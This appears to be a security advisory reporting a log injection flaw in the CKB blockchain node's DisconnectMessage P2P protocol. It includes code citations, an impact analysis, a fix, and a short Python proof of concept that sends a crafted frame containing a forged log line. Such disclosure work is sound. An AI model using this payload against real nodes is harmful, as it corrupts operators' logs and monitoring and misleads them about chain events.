### Title
Log Injection via Unsanitized Peer-Controlled String in DisconnectMessage Protocol — (File: `network/src/protocols/disconnect_message.rs`)

---

### Summary

An unprivileged remote peer can inject arbitrary newline-delimited content into the CKB node's log file and stdout by sending a crafted UTF-8 string over the `DisconnectMessage` P2P protocol. The peer-controlled string is embedded directly into a log line without stripping newline or carriage-return characters, allowing an attacker to forge fake log entries that are visually indistinguishable from legitimate CKB node output.

---

### Finding Description

In `network/src/protocols/disconnect_message.rs`, the `received` handler accepts any valid UTF-8 byte sequence from a remote peer and logs it verbatim at `INFO` level: [1](#0-0) 

```rust
if let Ok(message) = String::from_utf8(data.to_vec()) {
    info!(
        "Received disconnect message from peer={}: {}",
        session_id, message
    );
}
```

The only validation performed is that the bytes are valid UTF-8. No check is made for embedded newlines (`\n`), carriage returns (`\r`), or other control characters.

The logger service formats each record as a single line: [2](#0-1) 

```
{date} {thread_name} {level} {target}  {args}
```

and writes it to stdout and/or the log file with a trailing `\n`: [3](#0-2) 

The only sanitization applied before writing is `sanitize_color`, which strips ANSI escape sequences only — it does **not** strip newlines: [4](#0-3) 

```rust
fn sanitize_color(s: &str) -> String {
    let re = RE.get_or_init(|| Regex::new("\x1b\\[[^m]+m")...);
    re.replace_all(s, "").to_string()
}
```

Because `record.args()` (which contains the peer-supplied string) is placed at the end of the format string and the result is written as-is, any `\n` inside the peer message terminates the current log line and begins a new one in the output stream.

---

### Impact Explanation

An attacker who can establish a TCP connection to a CKB node's P2P port (the default public-facing port) can:

1. **Forge arbitrary log entries** — by embedding a newline followed by a string that matches the CKB log timestamp/level/target format, the injected line is visually identical to a genuine node log entry.
2. **Mislead node operators** — fake entries such as `INFO ckb_chain  Block 0xdeadbeef... accepted` or `INFO ckb_tx_pool  Transaction 0x... submitted` could cause operators to believe events occurred that did not, or to overlook real anomalies buried in injected noise.
3. **Corrupt log-based monitoring** — automated log parsers, SIEM systems, or alerting pipelines that consume the CKB log file may be fed attacker-controlled structured data.

The `DisconnectMessage` protocol is enabled by default in the standard `support_protocols` configuration: [5](#0-4) 

---

### Likelihood Explanation

- The P2P port is publicly reachable on any mainnet/testnet node.
- No authentication or prior trust is required; any peer that completes the TCP handshake can send a `DisconnectMessage` frame.
- The `DisconnectMessage` protocol is intentionally designed to accept a free-form UTF-8 string — the comment in the source even says *"A protocol for just receive string message and log it"*: [6](#0-5) 

- Crafting the payload requires only the ability to open a TCP connection and write a length-prefixed byte frame — trivially achievable with any scripting language.

---

### Recommendation

Strip or escape newline and carriage-return characters from the peer-supplied message before logging it. The minimal fix is to apply sanitization at the point of use:

```rust
// network/src/protocols/disconnect_message.rs
if let Ok(message) = String::from_utf8(data.to_vec()) {
    let sanitized = message.replace(['\n', '\r', '\x00'], " ");
    info!(
        "Received disconnect message from peer={}: {}",
        session_id, sanitized
    );
}
```

Alternatively, extend `sanitize_color` in `util/logger-service/src/lib.rs` to also strip control characters before writing to file/stdout, providing a defence-in-depth layer for all log targets.

---

### Proof of Concept

```python
import socket, struct

# CKB p2p framing: 4-byte little-endian length prefix + payload
def send_disconnect_msg(host, port):
    # Craft a payload that injects a fake log line
    fake_log = (
        "Disconnecting\n"
        "2024-01-01 00:00:00.000 +00:00 ckb-chain INFO ckb_chain  "
        "Block 0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"
        "deadbeefdeadbeef accepted\n"
    ).encode()
    # DisconnectMessage protocol id = 4 (default in CKB)
    # Tentacle framing: [length:4LE][proto_id:2LE][data]
    proto_id = struct.pack("<H", 4)
    frame = proto_id + fake_log
    length = struct.pack("<I", len(frame))
    with socket.create_connection((host, port)) as s:
        s.sendall(length + frame)

send_disconnect_msg("127.0.0.1", 8115)
```

After execution, the node's log file will contain a line beginning with the injected timestamp and level, indistinguishable from a genuine `ckb_chain` log entry.

### Citations

**File:** network/src/protocols/disconnect_message.rs (L12-13)
```rust
// A protocol for just receive string message and log it use debug level.
pub(crate) struct DisconnectMessageProtocol(Arc<NetworkState>);
```

**File:** network/src/protocols/disconnect_message.rs (L25-32)
```rust
    async fn received(&mut self, context: ProtocolContextMutRef<'_>, data: Bytes) {
        let session_id = context.session.id;
        if let Ok(message) = String::from_utf8(data.to_vec()) {
            info!(
                "Received disconnect message from peer={}: {}",
                session_id, message
            );
        } else {
```

**File:** util/logger-service/src/lib.rs (L227-240)
```rust
                                if main_logger.to_stdout {
                                    let output = if main_logger.color {
                                        data.as_str()
                                    } else {
                                        removed_color.as_str()
                                    };
                                    println!("{output}");
                                }
                                if main_logger.to_file
                                    && let Some(mut file) = main_logger.file.as_ref()
                                {
                                    let _ = file.write_all(removed_color.as_bytes());
                                    let _ = file.write_all(b"\n");
                                };
```

**File:** util/logger-service/src/lib.rs (L444-451)
```rust
                    format!(
                        "{} {} {} {}  {}",
                        date,
                        thread_name,
                        record.level(),
                        record.target(),
                        record.args()
                    )
```

**File:** util/logger-service/src/lib.rs (L473-476)
```rust
fn sanitize_color(s: &str) -> String {
    let re = RE.get_or_init(|| Regex::new("\x1b\\[[^m]+m").expect("Regex compile success"));
    re.replace_all(s, "").to_string()
}
```

**File:** network/src/network.rs (L925-938)
```rust
        // DisconnectMessage protocol
        if config
            .support_protocols
            .contains(&SupportProtocol::DisconnectMessage)
        {
            let disconnect_message_state = Arc::clone(&network_state);
            let disconnect_message_meta = SupportProtocols::DisconnectMessage
                .build_meta_with_service_handle(move || {
                    ProtocolHandle::Callback(Box::new(DisconnectMessageProtocol::new(
                        disconnect_message_state,
                    )))
                });
            protocol_metas.push(disconnect_message_meta);
        }
```
